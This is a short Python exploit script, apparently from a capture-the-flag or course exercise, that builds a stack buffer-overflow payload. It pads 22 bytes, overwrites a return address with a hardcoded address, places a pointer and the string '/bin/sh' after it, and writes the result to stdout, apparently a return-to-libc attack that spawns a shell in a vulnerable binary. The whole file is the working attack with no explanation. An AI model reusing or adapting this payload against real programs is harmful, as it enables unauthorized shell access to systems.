import sys
#cant use shell code
if __name__ == "__main__":
    attack = b"a" * 22
    attack += 0x804fef0.to_bytes(4, "little")

    attack += b"a" * 4
    attack += 0xFFF692D8.to_bytes(4, "little")
    
    attack += b"/bin/sh"
    #shellcode
    sys.stdout.buffer.write(attack)
